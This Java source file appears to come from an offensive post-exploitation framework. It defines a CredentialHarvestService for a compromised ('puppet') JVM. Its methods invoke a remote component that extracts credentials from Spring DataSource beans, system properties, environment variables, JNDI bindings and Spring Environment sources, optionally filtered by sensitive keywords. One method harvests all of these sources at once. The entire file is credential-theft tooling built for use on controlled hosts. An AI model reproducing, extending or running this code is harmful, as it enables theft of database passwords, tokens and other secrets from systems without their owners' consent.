package org.leo.core.puppet.service;

import org.leo.core.net.Communication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 凭据采集服务
 * <p>
 * 封装 CredentialHarvestComponent 的调用，在 puppet 侧 JVM 运行时提取凭据信息。
 */
public class CredentialHarvestService extends ComponentService {

    private static final String COMPONENT_NAME = "CredentialHarvestComponent";

    public CredentialHarvestService(Communication communication,
                                   List<RequestLayer> requestLayers,
                                   List<ResponseLayer> responseLayers) {
        super(communication, requestLayers, responseLayers);
    }

    /**
     * 一键采集所有凭据来源（DataSource、System Properties、Env、JNDI、Spring Environment）
     *
     * @param filter 自定义关键字过滤器（可为 null，仅按内置敏感关键字匹配）
     */
    public Map<String, Object> harvestAll(String filter) throws Exception {
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("op", 0);
        if (filter != null && !filter.isEmpty()) {
            params.put("filter", filter);
        }
        return invokeComponent(COMPONENT_NAME, params);
    }

    /**
     * 仅采集 Spring DataSource Bean 凭据
     */
    public Map<String, Object> harvestDataSources() throws Exception {
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("op", 1);
        return invokeComponent(COMPONENT_NAME, params);
    }

    /**
     * 仅采集 System Properties 中的敏感条目
     *
     * @param filter 自定义关键字过滤器（可为 null）
     */
    public Map<String, Object> harvestSystemProperties(String filter) throws Exception {
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("op", 2);
        if (filter != null && !filter.isEmpty()) {
            params.put("filter", filter);
        }
        return invokeComponent(COMPONENT_NAME, params);
    }

    /**
     * 仅采集环境变量中的敏感条目
     *
     * @param filter 自定义关键字过滤器（可为 null）
     */
    public Map<String, Object> harvestEnvVars(String filter) throws Exception {
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("op", 3);
        if (filter != null && !filter.isEmpty()) {
            params.put("filter", filter);
        }
        return invokeComponent(COMPONENT_NAME, params);
    }

    /**
     * 仅采集 JNDI 绑定的 DataSource
     */
    public Map<String, Object> harvestJndi() throws Exception {
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("op", 4);
        return invokeComponent(COMPONENT_NAME, params);
    }

    /**
     * 仅采集 Spring Environment PropertySource 中的敏感配置
     *
     * @param filter 自定义关键字过滤器（可为 null）
     */
    public Map<String, Object> harvestSpringEnv(String filter) throws Exception {
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("op", 5);
        if (filter != null && !filter.isEmpty()) {
            params.put("filter", filter);
        }
        return invokeComponent(COMPONENT_NAME, params);
    }
}
